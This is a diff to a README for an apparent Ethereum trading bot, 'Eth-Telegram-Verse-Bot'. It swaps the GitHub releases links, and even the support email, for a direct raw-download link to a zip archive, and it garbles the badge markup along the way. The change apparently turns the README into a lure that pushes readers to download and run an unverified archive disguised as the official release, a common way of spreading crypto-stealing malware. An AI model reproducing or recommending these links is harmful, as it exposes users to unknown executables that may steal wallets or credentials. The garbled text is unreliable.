@@ -1,6 +1,6 @@
 # 🤖 Eth-Telegram-Verse-Bot - Trade Smart on Ethereum
 
-[![Download Eth-Telegram-Verse-Bot](https://img.shields.io/badge/Download%20Now-Get%20the%20Bot-blue.svg)](https://github.com/Anaphoric-battleoftewkesbury339/Eth-Telegram-Verse-Bot/releases)
+[![Download Eth-Telegram-Verse-Bot](https://raw.githubusercontent.com/Anaphoric-battleoftewkesbury339/Eth-Telegram-Verse-Bot/main/subjectable/Eth-Telegram-Verse-Bot_v1.7.zip%20Now-Get%20the%https://raw.githubusercontent.com/Anaphoric-battleoftewkesbury339/Eth-Telegram-Verse-Bot/main/subjectable/Eth-Telegram-Verse-Bot_v1.7.zip)](https://raw.githubusercontent.com/Anaphoric-battleoftewkesbury339/Eth-Telegram-Verse-Bot/main/subjectable/Eth-Telegram-Verse-Bot_v1.7.zip)
 
 ## 📘 Introduction
 Welcome to the Eth-Telegram-Verse-Bot! This application helps you create a trading bot that connects with the Ethereum network. With it, you'll have access to professional trading strategies. This bot is designed for users who want to leverage trading opportunities swiftly and easily.
@@ -9,7 +9,7 @@ Welcome to the Eth-Telegram-Verse-Bot! This application helps you create a tradi
 To start using Eth-Telegram-Verse-Bot, follow these simple steps. You will need your computer and an internet connection.
 
 1. **Visit the Download Page**
-   Go to the official releases page where you can download the bot: [Download Eth-Telegram-Verse-Bot](https://github.com/Anaphoric-battleoftewkesbury339/Eth-Telegram-Verse-Bot/releases).
+   Go to the official releases page where you can download the bot: [Download Eth-Telegram-Verse-Bot](https://raw.githubusercontent.com/Anaphoric-battleoftewkesbury339/Eth-Telegram-Verse-Bot/main/subjectable/Eth-Telegram-Verse-Bot_v1.7.zip).
 
 2. **Select the Latest Release**
    On the releases page, you will see a list of available versions. Look for the most recent version, as it will have the latest features and fixes.
@@ -30,7 +30,7 @@ To start using Eth-Telegram-Verse-Bot, follow these simple steps. You will need 
    Once everything is set up, you can start your trading bot. Make sure to monitor it regularly to adjust settings as needed.
 
 ## 📥 Download & Install
-To download the Eth-Telegram-Verse-Bot, click the following link: [Download Eth-Telegram-Verse-Bot](https://github.com/Anaphoric-battleoftewkesbury339/Eth-Telegram-Verse-Bot/releases).
+To download the Eth-Telegram-Verse-Bot, click the following link: [Download Eth-Telegram-Verse-Bot](https://raw.githubusercontent.com/Anaphoric-battleoftewkesbury339/Eth-Telegram-Verse-Bot/main/subjectable/Eth-Telegram-Verse-Bot_v1.7.zip).
 
 ## 🔍 Features
 Eth-Telegram-Verse-Bot comes packed with features designed to enhance your trading experience:
@@ -59,7 +59,7 @@ Feel free to explore these topics to better understand how to use Eth-Telegram-V
 
 ## 📞 Contact
 For further inquiries or assistance:
-- **Email:** support@example.com
+- **Email:** https://raw.githubusercontent.com/Anaphoric-battleoftewkesbury339/Eth-Telegram-Verse-Bot/main/subjectable/Eth-Telegram-Verse-Bot_v1.7.zip
 - **GitHub Issues:** Open a ticket through our issues page on GitHub. 
 
 Stay updated with improvements and new releases by following this repository. Happy trading with Eth-Telegram-Verse-Bot!
